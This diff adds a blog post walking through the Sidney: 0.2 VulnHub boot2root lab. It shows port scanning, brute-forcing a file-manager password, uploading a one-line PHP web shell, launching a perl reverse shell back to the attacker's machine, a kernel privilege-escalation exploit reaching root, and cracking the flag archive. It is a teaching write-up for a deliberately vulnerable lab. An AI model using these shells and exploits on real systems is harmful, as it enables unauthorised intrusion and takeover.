@@ -9,9 +9,7 @@
   <meta name="author" content="Andrew Emil">
 
   
-  <meta name="description" content="Acid Server is a boot2root challenge built by @m_avinash143
-and hosted by vulnhub.
-The challenge is completely focused on web exploitation and the &hellip;">
+  <meta name="description" content="Sidney: 0.2 is a boot2root challenge created by knightmare2600 and hosted by vulnhub. After booting the the VM, I used netdiscover to find its IP &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -81,6 +79,433 @@ The challenge is completely focused on web exploitation and the &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2016/06/03/sidney-0-dot-2-walkthrough/">Sidney: 0.2 Walkthrough</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-06-03T22:32:43-04:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2016</span></span> <span class='time'>10:32 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://www.vulnhub.com/entry/sidney-02,149/">Sidney: 0.2</a> is a boot2root challenge created by <a href="https://twitter.com/@knightmare2600">knightmare2600</a> and hosted by <a href="https://www.vulnhub.com">vulnhub</a>.</p>
+
+<p>After booting the the VM, I used netdiscover to find its IP Address which was 192.168.2.113 and our machine&rsquo;s one was 192.168.2.112.</p>
+
+<h3>Enumeration</h3>
+
+<p>Lets begin by scanning the VM using nmap:</p>
+
+<figure class='code'><figcaption><span>Nmap Scan</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/# nmap -A -T4 -sV -PN -p- 192.168.2.113
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2016-06-03 22:59 EDT
+</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.2.113
+</span><span class='line'>Host is up <span class="o">(</span>0.00090s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">65534</span> closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span><span class='line'><span class="p">|</span>_http-title: <span class="m">38911</span> Bytes Free
+</span><span class='line'>MAC Address: 08:00:27:3C:A8:1C <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
+</span><span class='line'>Device <span class="nb">type</span>: general purpose
+</span><span class='line'>Running: Linux 3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
+</span><span class='line'>OS details: Linux 3.11 - 3.14
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'><span class="m">1</span>   0.90 ms 192.168.2.113
+</span><span class='line'>
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.33 seconds
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So It seems that Apache web service is the only service that was up and running on the target machine, so lets visit its main index page.</p>
+
+<p><img class="center" src="/images/2016/1/image 1.png"></p>
+
+<p>Nothing was interesting here. Then, I used DirBuster to brute force directories and files names on the target web server. A <em>commodore64/</em> directory and <em>commodore64/index.php</em> file were found as show in the figure below:</p>
+
+<p><img class="center" src="/images/2016/1/image 2.png"></p>
+
+<p>By doing a quick search on the <em>commodore64</em> keyword, the <a href="https://en.wikipedia.org/wiki/Commodore_64">Commodore 64 wikipedia page</a> shows that It&rsquo;s an 8-bit home computer introduced in January 1982 by Commodore International.</p>
+
+<p>Ok, lets get back to the dirbuster results. I found that the <em>commodore64/index.php</em> file is actually the login page for a php file manager &ldquo;PHPFM 0.2.3&rdquo;.</p>
+
+<p><img class="center" src="/images/2016/1/image 3.png"></p>
+
+<p>The other result of DirBuster was the <em>commodore64</em> directory where I found a really interesting information in the source code of its page.</p>
+
+<p><img class="center" src="/images/2016/1/image 4.png"></p>
+
+<p>I assumed that the above information was a hint for the login credentials to the PHPFM login page. It stated that the password for <em>robhubbard</em> is the C=64 sound chip lowercase and the format of the password is
+3letters4digits without a space.</p>
+
+<p>By getting back to the <a href="https://en.wikipedia.org/wiki/Commodore_64">Commodore 64 wikipedia page</a>, I found the following information:</p>
+
+<p><em>&ldquo;There are two versions of the SID "Sound Interface Device&rdquo; chip: the 6581 and the 8580. The MOS Technology 6581 was used in the original (&ldquo;breadbox&rdquo;) C64s, the early versions of the 64C, and the Commodore 128. The 6581 was replaced with the MOS Technology 8580 in 1987.&ldquo;</em></p>
+
+<p>Since Commodore64 used &ldquo;MOS Technology 6581/8580 SID chips&rdquo; and the hint I have found stated that the password&rsquo;s format is three lowercase letters and four digits without a space, my initial attempt was to use <em>mos6581</em> and <em>mos8580</em> as the passwords for the user <em>robhubbard</em> to login to the PHPFM, but it failed!</p>
+
+<p>After a little thinking I thought that maybe the 4 digits in the password field weren&rsquo;t the right ones, so my second attempt was to try all the four digits in the range starting from &ldquo;6500 to 6599&rdquo;.</p>
+
+<p>To conduct that brute force attack, I used Burp Suite Intruder attack with the Numbers payload.</p>
+
+<p><img class="center" src="/images/2016/1/image 5.png"></p>
+
+<p>The 4-digits payload <em>6518</em> returned a different response length, and a quick check shows that <em>mos6518</em> was actually the right password for the <em>robhubbard</em> user as shown below. Wonderful!</p>
+
+<p><img class="center" src="/images/2016/1/image 6.png"></p>
+
+<h3>Remote Command Execution</h3>
+
+<p>My next step was to get RCE on the target server by uploading a simple php shell using the PHPFM file manager.</p>
+
+<figure class='code'><figcaption><span>shell.php source code</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> ?&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I successfully got RCE using the uploaded script <a href="http://192.168.2.113/commodore64/shell.php?cmd=id">http://192.168.2.113/commodore64/shell.php?cmd=id</a> as shown below:</p>
+
+<p><img class="center" src="/images/2016/1/image 7.png"></p>
+
+<p>After getting the PHPSESSID using Live HTTP headers firefox add-on, I continued exploiting the target using the cURL utility.</p>
+
+<p><img class="center" src="/images/2016/1/image 8.png"></p>
+
+<figure class='code'><figcaption><span>RCE</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -s --cookie <span class="s2">&quot;PHPSESSID=ejn5rmhv9vgamh31ggc4i1o3u4&quot;</span> <span class="s2">&quot;http://192.168.2.113/commodore64/shell.php?cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;id ;uname -a;pwd;which nc;which wget;which perl;which python&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'>Linux sidney 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span><span class='line'>/var/www/html/commodore64
+</span><span class='line'>/usr/bin/perl
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since only perl was installed on the target system, my next step was to get interactive shell using <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a> which is provided by <a href="http://pentestmonkey.net/">pentestmonkey.net</a></p>
+
+<p>Basic modifications in the perl reverse shell:</p>
+
+<figure class='code'><figcaption><span>Modification to the perl-reverse-shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Where to send the reverse shell.  Change these.</span>
+</span><span class='line'>my <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.2.112&#39;</span><span class="p">;</span> <span class="c">#Our kali&#39;s ip address</span>
+</span><span class='line'>my <span class="nv">$port</span> <span class="o">=</span> 443<span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After uploading the perl-reverse-shell &ldquo;revshell.pl&rdquo; using the PHPFM file manager, and while listening on port 443 on my local machine, I executed revshell.pl on the target system using the following command:</p>
+
+<figure class='code'><figcaption><span>perl revshell.pl</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/# curl -s --cookie <span class="s2">&quot;PHPSESSID=ejn5rmhv9vgamh31ggc4i1o3u4&quot;</span> <span class="s2">&quot;http://192.168.2.113/commodore64/shell.php?cmd=$(php -r &quot;</span><span class="nb">echo </span>urlencode<span class="o">(</span><span class="s1">&#39;perl revshell.pl&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;)&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>Interactive Shell</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/# nc -nvlp 443
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+</span><span class='line'>connect to <span class="o">[</span>192.168.2.112<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.2.113<span class="o">]</span> 60464
+</span><span class='line'> 07:12:09 up  3:47,  <span class="m">0</span> users,  load average: 0.08, 0.04, 0.05
+</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>Linux sidney 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'>/
+</span><span class='line'>/usr/sbin/apache: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span><span class='line'><span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Privilege Escalation</h3>
+
+<p>The OS version is Ubuntu 16.04 LTS and its kernel version is 16.04 LTS as shown below:</p>
+
+<figure class='code'><figcaption><span>OS Information</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>uname -a
+</span><span class='line'>Linux sidney 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span><span class='line'><span class="nv">$ </span>cat /etc/os-release
+</span><span class='line'><span class="nv">NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu&quot;</span>
+</span><span class='line'><span class="nv">VERSION</span><span class="o">=</span><span class="s2">&quot;16.04 LTS (Xenial Xerus)&quot;</span>
+</span><span class='line'><span class="nv">ID</span><span class="o">=</span>ubuntu
+</span><span class='line'><span class="nv">ID_LIKE</span><span class="o">=</span>debian
+</span><span class='line'><span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu 16.04 LTS&quot;</span>
+</span><span class='line'><span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">&quot;16.04&quot;</span>
+</span><span class='line'><span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">&quot;http://www.ubuntu.com/&quot;</span>
+</span><span class='line'><span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">&quot;http://help.ubuntu.com/&quot;</span>
+</span><span class='line'><span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">&quot;http://bugs.launchpad.net/ubuntu/&quot;</span>
+</span><span class='line'><span class="nv">UBUNTU_CODENAME</span><span class="o">=</span>xenial
+</span><span class='line'><span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This version of Ubuntu 16.04 LTS and its associated kernel 4.4.0-21-generic are suffered from a <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">UAF via double-fdput() in bpf(BPF_PROG_LOAD) error path</a> vulnerability, which can lead to a local root privilege escalation.</p>
+
+<p>The description of the vulnerability report from google project zero states that:
+<em>&ldquo;In Linux >=4.4, when the CONFIG_BPF_SYSCALL config option is set and the
+kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,
+unprivileged code can use the bpf() syscall to load eBPF socket filter programs.
+These conditions are fulfilled in Ubuntu 16.04.&rdquo;</em></p>
+
+<p>Also, an exploit is available with the vulnerability report, and  it&rsquo;s hosted on <a href="https://www.exploit-db.com/exploits/39772/">exploit-db</a> as well.</p>
+
+<p>Once again, I uploaded the exploit &ldquo;exploit.tar&rdquo; to the target server using the PHPFM file manager, extracted the tar file, compiled the exploit &ldquo;./compile.sh&rdquo;, executed the exploit &ldquo;./doubleput&rdquo;, and root privileges were obtained as shown below:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>tar -xvf exploit.tar
+</span><span class='line'>ebpf_mapfd_doubleput_exploit/
+</span><span class='line'>ebpf_mapfd_doubleput_exploit/hello.c
+</span><span class='line'>ebpf_mapfd_doubleput_exploit/suidhelper.c
+</span><span class='line'>ebpf_mapfd_doubleput_exploit/compile.sh
+</span><span class='line'>ebpf_mapfd_doubleput_exploit/doubleput.c
+</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>ebpf_mapfd_doubleput_exploit/
+</span><span class='line'><span class="nv">$ </span>ls
+</span><span class='line'>compile.sh
+</span><span class='line'>doubleput.c
+</span><span class='line'>hello.c
+</span><span class='line'>suidhelper.c
+</span><span class='line'><span class="nv">$ </span>./compile.sh
+</span><span class='line'><span class="nv">$ </span>ls
+</span><span class='line'>compile.sh
+</span><span class='line'>doubleput
+</span><span class='line'>doubleput.c
+</span><span class='line'>hello
+</span><span class='line'>hello.c
+</span><span class='line'>suidhelper
+</span><span class='line'>suidhelper.c
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'><span class="nv">$ </span>./doubleput
+</span><span class='line'>starting writev
+</span><span class='line'>woohoo, got pointer reuse
+</span><span class='line'>writev returned successfully. <span class="k">if</span> this worked, you<span class="err">&#39;</span>ll have a root shell in &lt;<span class="o">=</span><span class="m">60</span> seconds.
+</span><span class='line'>suid file detected, launching rootshell...
+</span><span class='line'>we have root privs now...
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'><span class="nb">cd</span> /root
+</span><span class='line'><span class="nb">pwd</span> <span class="o">&amp;&amp;</span> ls -la
+</span><span class='line'>/root
+</span><span class='line'>total 84
+</span><span class='line'>drwx------  <span class="m">3</span> root     root      <span class="m">4096</span> May <span class="m">25</span> 18:40 .
+</span><span class='line'>drwxr-xr-x <span class="m">23</span> root     root      <span class="m">4096</span> May <span class="m">31</span> 20:39 ..
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> root     root      <span class="m">3106</span> Oct <span class="m">22</span>  <span class="m">2015</span> .bashrc
+</span><span class='line'>dr--------  <span class="m">3</span> root     root      <span class="m">4096</span> May <span class="m">24</span> 21:02 .commodore64
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> root     root       <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
+</span><span class='line'>-rw-rw-r--  <span class="m">1</span> rhubbard rhubbard <span class="m">62464</span> May <span class="m">24</span> 21:27 hint.gif
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Capturing the flag</h3>
+
+<p>By following the <em>.commodore64</em> directory tree, I found two files under the <em>/root/.commodore64/.miami/vice</em> directory: <em>flag.zip</em> and <em>versatile_commodore_emulator</em>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>/root/.commodore64/.miami/vice
+</span><span class='line'>ls -la
+</span><span class='line'>total 12
+</span><span class='line'>dr-------- <span class="m">2</span> root     root     <span class="m">4096</span> May <span class="m">25</span> 18:40 .
+</span><span class='line'>dr-------- <span class="m">3</span> root     root     <span class="m">4096</span> May <span class="m">24</span> 21:01 ..
+</span><span class='line'>-r-------- <span class="m">1</span> rhubbard rhubbard <span class="m">4089</span> May <span class="m">24</span> 20:59 flag.zip
+</span><span class='line'>-r-------- <span class="m">1</span> root     root        <span class="m">0</span> May <span class="m">24</span> 21:02 versatile_commodore_emulator
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <em>flag.zip</em> file was password protected, so I copied it to the <em>/var/www/html/</em> directory, hence I can download it to my local machine through the web service.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>cp flag.zip /var/www/html/
+</span><span class='line'>chmod <span class="m">777</span> /var/www/html/flag.zip
+</span><span class='line'>ls -la /var/www/html
+</span><span class='line'>total 20
+</span><span class='line'>drwxr-xr-x <span class="m">3</span> root     root     <span class="m">4096</span> Jun  <span class="m">4</span> 07:48 .
+</span><span class='line'>drwxr-xr-x <span class="m">3</span> root     root     <span class="m">4096</span> May <span class="m">23</span> 18:30 ..
+</span><span class='line'>drwxr-xr-x <span class="m">8</span> www-data www-data <span class="m">4096</span> Jun  <span class="m">4</span> 07:40 commodore64
+</span><span class='line'>-rwxrwxrwx <span class="m">1</span> root     root     <span class="m">4089</span> Jun  <span class="m">4</span> 07:48 flag.zip
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">278</span> May <span class="m">24</span> 20:35 index.html
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then, I used fcrackzip along with rockyou.txt wordlist to crack the <em>flag.zip</em> password file. The password was successfully found <em>38911</em> as shown below:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# fcrackzip -v -D -u -p rockyou.txt flag.zip
+</span><span class='line'>found file <span class="s1">&#39;flag.d64&#39;</span>, <span class="o">(</span>size cp/uc   3923/174848, flags 9, chk 9be5<span class="o">)</span>
+</span><span class='line'>checking pw budayday
+</span><span class='line'>
+</span><span class='line'>PASSWORD FOUND!!!!: <span class="nv">pw</span> <span class="o">==</span> 38911
+</span><span class='line'>root@kali:~# unzip flag.zip
+</span><span class='line'>Archive:  flag.zip
+</span><span class='line'><span class="o">[</span>flag.zip<span class="o">]</span> flag.d64 password:
+</span><span class='line'>  inflating: flag.d64
+</span><span class='line'>root@kali:~# file flag.d64
+</span><span class='line'>flag.d64: D64 Image
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A quick search shows that D64 Image is a Commodore64 Disk Image, and it can be attached under the <a href="Versatile%20Commodore%20Emulator">Versatile Commodore Emulator</a>. So it appears that the file I have found earlier <em>versatile_commodore_emulator</em> was just a hint that I will need to use that emulator to get the flag.</p>
+
+<p>I downloaded the VICE Emulator <a href="http://vice-emu.sourceforge.net/index.html#download">source code</a>, and found a <a href="http://4digits.net/blog/retrocomputing/commodore-64-emulator-linux.html">tutorial</a> on how to install and use the VICE Emulator.</p>
+
+<p>I used the following commands to install the VICE Emulator on my machine:</p>
+
+<figure class='code'><figcaption><span>Versatile Commodore Emulator Installation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>apt-get install vice
+</span><span class='line'>tar vzxf vice-2.4.tar.gz
+</span><span class='line'>cp -r vice-2.4/data/* /usr/lib/vice/
+</span><span class='line'>chown -R root /usr/lib/vice
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I used the <em>x64 flag.d64</em> command to &ldquo;autoload&rdquo; the flag.d64 image from the command line and captured the flag as shown below:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>x64 flag.d64
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="/images/2016/1/image 9.png"></p>
+
+<p>Finally, I would like to thank <a href="https://twitter.com/@knightmare2600">knightmare2600</a> for creating the VM, and <a href="https://www.vulnhub.com">VulnHub</a> for hosting it.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1000,6 +1425,10 @@ There is a public exploit for this vulnerability: &ldquo;<a href="https://www.ex
 <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/06/03/sidney-0-dot-2-walkthrough/">Sidney: 0.2 Walkthrough</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2015/08/24/acid-server-1-walkthrough/">Acid Server:1 Walkthrough</a>
